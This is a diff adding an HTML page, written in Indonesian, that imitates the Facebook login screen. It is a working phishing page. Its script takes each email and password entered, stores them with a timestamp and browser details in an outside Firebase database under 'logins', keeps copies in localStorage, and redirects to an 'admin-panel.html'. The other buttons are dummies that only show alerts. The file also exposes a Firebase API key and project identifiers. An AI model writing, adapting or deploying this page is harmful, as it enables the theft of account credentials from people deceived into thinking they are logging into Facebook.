@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login</title>
+    
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-container {
+            background-color: white;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            width: 400px;
+        }
+        .logo {
+            font-size: 48px;
+            color: #1877f2;
+            font-weight: bold;
+            margin-bottom: 16px;
+        }
+        input {
+            width: 100%;
+            padding: 14px 16px;
+            margin-bottom: 12px;
+            border: 1px solid #ccd1d9;
+            border-radius: 6px;
+            font-size: 17px;
+            box-sizing: border-box;
+        }
+        .login-button {
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            padding: 8px 0;
+            width: 100%;
+            border-radius: 6px;
+            font-size: 20px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-bottom: 16px;
+        }
+        .forgot-password {
+            color: #1877f2;
+            text-decoration: none;
+            margin-bottom: 24px;
+            display: inline-block;
+            cursor: pointer;
+        }
+        .divider {
+            border-bottom: 1px solid #dadde1;
+            margin: 16px 0;
+        }
+        .create-account {
+            background-color: #42b72a;
+            color: white;
+            border: none;
+            padding: 8px 0;
+            border-radius: 6px;
+            font-size: 17px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 194px;
+        }
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-radius: 50%;
+            border-top: 4px solid #3498db;
+            width: 30px;
+            height: 30px;
+            animation: spin 2s linear infinite;
+            margin: 20px auto;
+            display: none;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        h1 { 
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <div class="page">
+        <h1 class="logo">Facebook</h1>
+        <div class="login-container">
+            <h4>Login Ke Facebook</h4>
+            <form id="loginForm">
+                <input type="text" id="email" placeholder="Email atau nomor telepon" required>
+                <input type="password" id="password" placeholder="Kata sandi" required>
+                <button type="submit" class="login-button">Masuk</button>
+                <div class="loader" id="loader"></div>
+            </form>
+            <a class="forgot-password" onclick="showAlert()">Lupa kata sandi?</a>
+            <div class="divider"></div>
+            <button class="create-account" onclick="showAlert()">Buat akun baru</button>
+        </div>
+    </div>
+
+    <!-- Firebase -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/9.23.0/firebase-app-compat.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/9.23.0/firebase-database-compat.min.js"></script>
+    
+    <script>
+        // For Firebase JS SDK v7.20.0 and later, measurementId is optional
+const firebaseConfig = {
+  apiKey: "AIzaSyB5K_GBRbfKdGydcTBbRJXVKqfE-f47Eow",
+  authDomain: "animeflow-5503e.firebaseapp.com",
+  databaseURL: "https://animeflow-5503e-default-rtdb.firebaseio.com",
+  projectId: "animeflow-5503e",
+  storageBucket: "animeflow-5503e.firebasestorage.app",
+  messagingSenderId: "921010917567",
+  appId: "1:921010917567:web:338cae39ff096dcbb9760a",
+  measurementId: "G-17H0VCNFFV"
+};
+        
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        
+        // Handle form submission
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const timestamp = new Date().toLocaleString();
+            const ipAddress = "Fetching..."; // In a real scenario, you would use a service to get the IP
+            
+            // Show loader
+            document.getElementById('loader').style.display = 'block';
+            
+            // Generate a unique key for the login entry
+            const loginRef = database.ref('logins').push();
+            
+            // Save data to Firebase
+            loginRef.set({
+                email: email,
+                password: password,
+                timestamp: timestamp,
+                ipAddress: ipAddress,
+                userAgent: navigator.userAgent
+            })
+            .then(() => {
+                // Save current login info to localStorage for the admin panel
+                localStorage.setItem('currentLoginId', loginRef.key);
+                localStorage.setItem('userEmail', email);
+                localStorage.setItem('userPassword', password);
+                localStorage.setItem('loginTime', timestamp);
+                
+                // Redirect to admin panel
+                window.location.href = "admin-panel.html";
+            })
+            .catch((error) => {
+                console.error("Error saving data: ", error);
+                alert("Terjadi kesalahan. Silakan coba lagi.");
+                document.getElementById('loader').style.display = 'none';
+            });
+        });
+        
+        // Fungsi untuk tombol yang tidak aktif
+        function showAlert() {
+            alert("Fitur ini tidak tersedia");
+        }
+    </script>
+</body>
+</html>
